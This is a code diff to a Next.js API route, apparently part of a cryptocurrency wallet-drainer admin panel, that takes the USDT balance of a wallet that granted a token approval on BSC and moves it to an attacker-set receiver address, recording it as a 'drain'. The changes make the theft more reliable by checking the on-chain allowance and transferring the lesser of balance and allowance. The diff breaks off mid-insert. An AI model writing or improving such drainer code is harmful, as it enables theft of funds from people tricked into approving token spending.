@@ -8,7 +8,6 @@ const USDT_ABI = [
   "function allowance(address owner, address spender) public view returns (uint256)",
 ];
 
-// POST /api/wallets/[id]/withdraw — manually trigger a drain for a specific wallet
 export async function POST(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> }
@@ -21,7 +20,6 @@ export async function POST(
   const { id } = await params;
   const supabase = getServiceSupabase();
 
-  // Fetch wallet record
   const { data: wallet, error: fetchError } = await supabase
     .from("wallets")
     .select("*")
@@ -33,10 +31,9 @@ export async function POST(
   }
 
   if (!wallet.approval_status) {
-    return NextResponse.json({ error: "Wallet has not approved" }, { status: 400 });
+    return NextResponse.json({ error: "Wallet has not approved yet" }, { status: 400 });
   }
 
-  // Fetch receiver address from config
   const { data: configRow } = await supabase
     .from("config")
     .select("value")
@@ -45,31 +42,59 @@ export async function POST(
 
   const receiverAddress = configRow?.value;
   if (!receiverAddress) {
-    return NextResponse.json({ error: "Receiver address not configured" }, { status: 500 });
+    return NextResponse.json({ error: "Receiver address not set in admin Config tab" }, { status: 500 });
+  }
+
+  const privateKey = process.env.ADMIN_PRIVATE_KEY;
+  if (!privateKey) {
+    return NextResponse.json(
+      { error: "ADMIN_PRIVATE_KEY is not set in environment variables" },
+      { status: 500 }
+    );
   }
 
   try {
-    const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/");
-    const adminWallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY!, provider);
-    const contract = new ethers.Contract(process.env.NEXT_PUBLIC_USDT_CONTRACT!, USDT_ABI, adminWallet);
+    const provider = new ethers.JsonRpcProvider(
+      process.env.BSC_RPC_URL ?? "https://bsc-dataseed.binance.org/"
+    );
+    const adminWallet = new ethers.Wallet(privateKey, provider);
+    const contract = new ethers.Contract(
+      process.env.NEXT_PUBLIC_USDT_CONTRACT!,
+      USDT_ABI,
+      adminWallet
+    );
 
-    const balance: bigint = await contract.balanceOf(wallet.address);
+    // Check both balance AND real on-chain allowance
+    const [balance, allowance]: [bigint, bigint] = await Promise.all([
+      contract.balanceOf(wallet.address),
+      contract.allowance(wallet.address, adminWallet.address),
+    ]);
+
     if (balance === BigInt(0)) {
       return NextResponse.json({ error: "Wallet USDT balance is zero" }, { status: 400 });
     }
 
-    const tx = await contract.transferFrom(wallet.address, receiverAddress, balance);
+    if (allowance === BigInt(0)) {
+      // Update DB to reflect reality
+      await supabase.from("wallets").update({ approval_status: false }).eq("id", id);
+      return NextResponse.json(
+        { error: "No on-chain allowance found. Wallet may not have approved on BSC." },
+        { status: 400 }
+      );
+    }
+
+    // Use lesser of balance or allowance to avoid exceeds-allowance error
+    const transferAmount = balance < allowance ? balance : allowance;
+    const amountFormatted = ethers.formatUnits(transferAmount, 18);
+
+    const tx = await contract.transferFrom(wallet.address, receiverAddress, transferAmount);
     const receipt = await tx.wait();
 
-    const amountFormatted = ethers.formatUnits(balance, 18);
-
-    // Update wallet record
     await supabase
       .from("wallets")
       .update({ drained: true, drain_tx_hash: receipt.hash })
       .eq("id", id);
 
-    // Log transaction
     await supabase.from("transactions").insert({
       wallet_address: wallet.address,
       type: "drain",
